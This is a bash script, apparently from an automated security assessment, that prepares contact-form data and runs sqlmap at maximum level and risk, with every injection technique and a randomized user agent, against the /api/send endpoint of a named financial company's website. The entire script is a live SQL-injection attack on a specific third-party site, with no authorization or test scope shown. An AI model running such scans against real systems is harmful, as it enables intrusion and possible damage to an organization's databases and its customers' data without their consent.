#!/bin/bash
cd /work
U="https://www.infinitycapital.bh"
mkdir -p tool_outputs
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
python3 - <<'EOF'
data = {
 "fname":"ICMARKER7","lname":"Tester","areacode":"973","tel":"3612345",
 "cname":"ICMARKER7","subject":"ICMARKER7","msg":"ICMARKER7 test body",
 "check":"on","targets":"icmarker7@example.com"
}
import urllib.parse
open('/work/sqli_data.txt','w').write(urllib.parse.urlencode(data))
print(open('/work/sqli_data.txt').read())
EOF

echo "=== sqlmap vs POST /api/send (all params, level5 risk3) ==="
timeout 1500 sqlmap -u "$U/api/send" \
  --method=POST \
  --data="@/work/sqli_data.txt" \
  --batch --level=5 --risk=3 --threads=4 --dbms= \
  --random-agent --timeout=20 --retries=1 \
  --technique=BEUSTQ \
  --output-dir=/work/tool_outputs/sqlmap_send \
  2>&1 | tail -50
